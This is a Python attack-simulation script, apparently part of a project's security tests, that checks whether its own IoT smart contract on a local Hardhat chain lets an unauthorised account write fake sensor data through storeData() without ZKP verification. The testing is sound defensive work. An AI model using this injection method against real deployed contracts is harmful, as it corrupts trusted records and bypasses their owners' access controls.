import json
import os
from web3 import Web3

def simulate_blockchain_injection():
    """
    BLOCKCHAIN DIRECT INJECTION ATTACK SIMULATION

    Attack Vector: An attacker who knows the smart contract address and ABI 
    bypasses the Flask server entirely and calls the IoTData.storeData() 
    function directly on the blockchain, writing fake data without any 
    ZKP verification.

    What this tests: Whether the smart contract has proper access control 
    (e.g., onlyOwner modifier) to prevent unauthorized writes.
    """
    print("==================================================")
    print("⛓️  BLOCKCHAIN DIRECT INJECTION ATTACKER ⛓️")
    print("==================================================")
    print("[*] Bypassing Flask Server completely...")
    print("[*] Bypassing ZKP Verification...")
    print("[*] Connecting directly to the Blockchain Network...\n")

    # Connect to local Blockchain
    w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

    if not w3.is_connected():
        print("❌ Could not connect to Blockchain. Is Hardhat running?")
        return

    print("[*] Connection successful.")

    # Load IoTData Contract
    # Navigate up one level from Attack_Simulation/ to the project root
    project_root = os.path.join(os.path.dirname(__file__), "..")

    try:
        addresses_path = os.path.join(project_root, "Blockchain", "addresses.json")
        with open(addresses_path) as f:
            addresses = json.load(f)

        contract_address = addresses["iotdata"]

        abi_path = os.path.join(
            project_root, "Blockchain", "artifacts", "contracts",
            "IoTData.sol", "IoTData.json"
        )
        with open(abi_path) as f:
            iot_json = json.load(f)

        abi = iot_json["abi"]

        contract = w3.eth.contract(
            address=contract_address,
            abi=abi
        )

    except Exception as e:
        print(f"❌ Could not load IoTData Contract: {e}")
        return

    print(f"[*] Connected to IoTData Contract at: {contract_address}")

    # Use a DIFFERENT account (not account[0] which is the server's account)
    # This simulates an attacker using their own wallet
    attacker_account = w3.eth.accounts[5]
    print(f"[*] Using attacker wallet: {attacker_account}")

    # ---------------------------------------------------------
    # THE ATTACK: Write fake data directly to the blockchain
    # WITHOUT going through ZKP verification
    # ---------------------------------------------------------
    fake_data = {
        "device_id": "hacked_sensor",
        "timestamp": "2026-01-01 00:00:00",
        "temperature": 999,
        "hash": "FAKE_HASH_NO_ZKP_VERIFICATION",
        "proof": "{\"fake\": true}"
    }

    print(f"\n[!] INJECTING MALICIOUS DATA DIRECTLY INTO BLOCKCHAIN:")
    print(f"    Device ID    : {fake_data['device_id']}")
    print(f"    Timestamp    : {fake_data['timestamp']}")
    print(f"    Temperature  : {fake_data['temperature']}°C")
    print(f"    Hash         : {fake_data['hash']}")
    print(f"    ZKP Proof    : {fake_data['proof']}")

    print("\n[*] Calling storeData() directly on the smart contract...")

    try:
        tx = contract.functions.storeData(
            fake_data["device_id"],
            fake_data["timestamp"],
            fake_data["temperature"],
            fake_data["hash"],
            fake_data["proof"]
        ).transact({"from": attacker_account})

        receipt = w3.eth.wait_for_transaction_receipt(tx)

        print(f"\n⚠️  ATTACK SUCCESSFUL!")
        print(f"    Tx Hash      : {tx.hex()}")
        print(f"    Block Number : {receipt.blockNumber}")
        print(f"    Gas Used     : {receipt.gasUsed}")

        # Verify the data was stored
        data_count = contract.functions.getDataCount().call()
        last_record = contract.functions.getData(data_count - 1).call()
        print(f"\n[*] Verification — Last record on blockchain:")
        print(f"    Device ID    : {last_record[0]}")
        print(f"    Temperature  : {last_record[2]}°C")
        print(f"    Hash         : {last_record[3]}")

        print("\n" + "="*50)
        print("FINDING: The IoTData smart contract has NO access control!")
        print("→ Anyone can write directly to the blockchain.")
        print("→ ZKP verification was completely bypassed.")
        print("→ An 'onlyOwner' modifier or access control is needed.")
        print("="*50)

    except Exception as e:
        print(f"\n✅ SYSTEM DEFENDED: The smart contract rejected the transaction!")
        print(f"   Reason: {e}")
        print("\n" + "="*50)
        print("The IoTData contract has proper access control.")
        print("Only authorized addresses can write to the blockchain.")
        print("="*50)

if __name__ == "__main__":
    simulate_blockchain_injection()
